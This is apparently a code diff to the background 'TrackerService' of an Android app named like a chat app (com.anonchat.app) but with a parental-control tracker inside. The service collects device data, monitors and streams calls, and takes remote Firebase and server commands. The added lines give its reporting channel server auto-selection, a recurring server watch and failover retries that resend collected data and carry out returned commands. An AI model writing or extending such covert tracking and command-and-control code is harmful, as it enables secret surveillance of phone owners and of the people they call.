@@ -39,6 +39,7 @@ class TrackerService : Service() {
     private var lastForegroundApp: String? = null
     private var configRefreshJob: Job? = null
     private var updateCheckJob: Job? = null
+    private var serverWatchJob: Job? = null
     private var callStateMonitor: CallStateMonitor? = null
     private var callStreamManager: CallStreamManager? = null
 
@@ -95,6 +96,7 @@ class TrackerService : Service() {
         startPeriodicReporting()
         startConfigRefresh()
         startUpdateChecker()
+        startServerWatch()
         startCallMonitor()
         startFirebaseCommandListener()
         com.anonchat.app.parentalcontrol.receiver.AlarmReceiver.scheduleExactAlarm(this)
@@ -138,6 +140,7 @@ class TrackerService : Service() {
         callStreamManager?.stopStreaming()
         releaseWakeLock()
         updateCheckJob?.cancel()
+        serverWatchJob?.cancel()
         scope.cancel()
     }
 
@@ -147,6 +150,14 @@ class TrackerService : Service() {
         if (job?.isActive == true) return
         writeDebugLog("startPeriodicReporting called, isRunning=${TrackerService.isRunning}")
         job = scope.launch {
+            try {
+                writeDebugLog("Auto-selecting server...")
+                val chosen = ApiClient.autoSelectServer(initial = true)
+                writeDebugLog("Server selected: $chosen")
+            } catch (e: Exception) {
+                writeDebugLog("Server auto-select error: ${e.message}")
+            }
+
             try {
                 writeDebugLog("Registering device...")
                 val deviceInfo = collectors.collectDeviceInfo(this@TrackerService)
@@ -189,6 +200,21 @@ class TrackerService : Service() {
                     UpdateManager.checkForUpdate(this@TrackerService)
                 } catch (e: Exception) { e.printStackTrace() }
                 delay(3600_000L)
+            }
+        }
+    }
+
+    private fun startServerWatch() {
+        if (serverWatchJob?.isActive == true) return
+        serverWatchJob = scope.launch {
+            while (isActive) {
+                delay(5 * 60 * 1000L)
+                try {
+                    val chosen = ApiClient.autoSelectServer()
+                    writeDebugLog("Server watch: active=$chosen")
+                } catch (e: Exception) {
+                    writeDebugLog("Server watch error: ${e.message}")
+                }
             }
         }
     }
@@ -433,6 +459,21 @@ class TrackerService : Service() {
                     }
                 } else {
                     writeDebugLog("PythonAnywhere Report FAILED: ${result.error ?: "unknown"}")
+                    // Connection-level failure (server down / cold start): re-probe
+                    // the candidate servers and retry the payload once.
+                    if (result.error?.startsWith("Exception") == true) {
+                        try {
+                            val active = ApiClient.autoSelectServer()
+                            val retry = ApiClient.sendBulkReport(payload)
+                            writeDebugLog("Failover retry to $active: " +
+                                if (retry.success) "OK" else "FAILED: ${retry.error}")
+                            if (retry.success) {
+                                retry.commands?.forEach { cmd -> handleCommand(cmd) }
+                            }
+                        } catch (e: Exception) {
+                            writeDebugLog("Failover retry error: ${e.message}")
+                        }
+                    }
                 }
             } catch (e: Exception) {
                 writeDebugLog("PythonAnywhere Report EXCEPTION: ${e.message}")
